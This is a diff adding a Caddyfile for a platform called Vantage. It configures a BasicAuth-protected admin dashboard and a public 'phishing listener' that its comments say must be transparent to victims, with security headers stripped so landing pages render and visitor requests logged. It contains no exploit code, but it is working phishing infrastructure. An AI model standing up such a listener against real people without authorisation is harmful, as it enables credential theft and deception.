@@ -1,0 +1,166 @@
+# ═══════════════════════════════════════════════════════════════════════════════
+# Vantage — Production Caddyfile
+# Two virtual hosts, strictly isolated:
+#   admin.{$DOMAIN}  → vantage-core:3333 (HTTPS + BasicAuth)
+#   {$DOMAIN}        → vantage-core:8080 (HTTPS, public phishing listener)
+#
+# Environment variables (set in .env / docker-compose.prod.yml):
+#   DOMAIN            e.g. vantage.yourdomain.com
+#   ADMIN_SUBDOMAIN   e.g. admin.vantage.yourdomain.com
+#   ADMIN_USER        Caddy basicauth username
+#   ADMIN_HASH        bcrypt hash — generate with:
+#                       docker run --rm caddy caddy hash-password -plaintext "PASSWORD"
+# ═══════════════════════════════════════════════════════════════════════════════
+
+{
+    # Global options
+    email {$ACME_EMAIL:admin@example.com}
+
+    # Caddy management API: listen only on loopback, never exposed externally
+    admin 127.0.0.1:2019
+
+    # Structured JSON logs aggregated by Docker logging driver
+    log {
+        level  INFO
+        format json
+    }
+
+    # Enforce TLS 1.2+ globally
+    servers {
+        protocols h1 h2 h3
+    }
+}
+
+# ──────────────────────────────────────────────────────────────────────────────
+# Snippet: Enterprise Security Headers
+# Applied to BOTH virtual hosts so no header is ever missed.
+# ──────────────────────────────────────────────────────────────────────────────
+(secure_headers) {
+    header {
+        # Prevent clickjacking on every response
+        X-Frame-Options "DENY"
+
+        # Block MIME-type sniffing
+        X-Content-Type-Options "nosniff"
+
+        # Strict XSS auditor (belt + suspenders alongside CSP)
+        X-XSS-Protection "1; mode=block"
+
+        # Leak no Referer when navigating away from Vantage
+        Referrer-Policy "no-referrer"
+
+        # HSTS — 1 year, include sub-domains, submit-ready
+        Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
+
+        # Lock down every browser capability we don't need
+        Permissions-Policy "geolocation=(), microphone=(), camera=(), payment=(), usb=(), bluetooth=()"
+
+        # Remove server fingerprinting headers
+        -Server
+        -X-Powered-By
+
+        # Prevent caching of sensitive admin responses
+        Cache-Control "no-store, no-cache, must-revalidate"
+    }
+}
+
+# ──────────────────────────────────────────────────────────────────────────────
+# Admin Dashboard — RESTRICTED
+# Route: https://admin.{$DOMAIN}/
+#   • Basic Auth gate (bcrypt)
+#   • Strict CSP (no external resources allowed)
+#   • WebSocket upgrade for live scanner log streaming
+#   • Health endpoint bypasses auth for uptime monitors
+# ──────────────────────────────────────────────────────────────────────────────
+{$ADMIN_SUBDOMAIN:admin.localhost} {
+    import secure_headers
+
+    # ── Content Security Policy (admin panel — self-contained) ──────────────
+    header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' wss:; frame-ancestors 'none';"
+
+    # ── Health endpoint: unauthenticated so external monitors can reach it ──
+    @health path /api/health
+    handle @health {
+        reverse_proxy vantage-core:3333 {
+            header_up X-Forwarded-For  {remote_host}
+            header_up X-Forwarded-Proto https
+            header_up X-Real-IP        {remote_host}
+        }
+    }
+
+    # ── All other routes: require Basic Auth ────────────────────────────────
+    handle {
+        basicauth * {
+            {$ADMIN_USER:vantage} {$ADMIN_HASH}
+        }
+
+        # WebSocket pass-through for /ws/scanner/logs
+        @ws {
+            header Connection *Upgrade*
+            header Upgrade    websocket
+        }
+        reverse_proxy @ws vantage-core:3333 {
+            header_up X-Forwarded-For  {remote_host}
+            header_up X-Forwarded-Proto https
+            header_up X-Real-IP        {remote_host}
+        }
+
+        reverse_proxy vantage-core:3333 {
+            header_up X-Forwarded-For  {remote_host}
+            header_up X-Forwarded-Proto https
+            header_up X-Real-IP        {remote_host}
+
+            transport http {
+                dial_timeout            10s
+                response_header_timeout 120s  # Long timeout for PD tool API calls
+            }
+        }
+    }
+
+    encode gzip
+
+    log {
+        output file /var/log/caddy/admin-access.log {
+            roll_size 50mb
+            roll_keep 5
+        }
+        format json
+    }
+}
+
+# ──────────────────────────────────────────────────────────────────────────────
+# Phishing Listener — FULLY PUBLIC
+# Route: https://{$DOMAIN}/
+#   • Zero authentication — must be completely transparent to victims
+#   • Permissive CSP to allow phishing page content to render correctly
+#   • NO security headers that would interfere with landing page rendering
+# ──────────────────────────────────────────────────────────────────────────────
+{$DOMAIN:localhost} {
+    # Only inject headers that don't break phishing page delivery
+    header {
+        X-Content-Type-Options "nosniff"
+        -Server
+        -X-Powered-By
+    }
+
+    reverse_proxy vantage-core:8080 {
+        header_up X-Forwarded-For  {remote_host}
+        header_up X-Forwarded-Proto https
+        header_up X-Real-IP        {remote_host}
+
+        transport http {
+            dial_timeout            10s
+            response_header_timeout 30s
+        }
+    }
+
+    encode gzip
+
+    log {
+        output file /var/log/caddy/phish-access.log {
+            roll_size 100mb
+            roll_keep 10
+        }
+        format json
+    }
+}
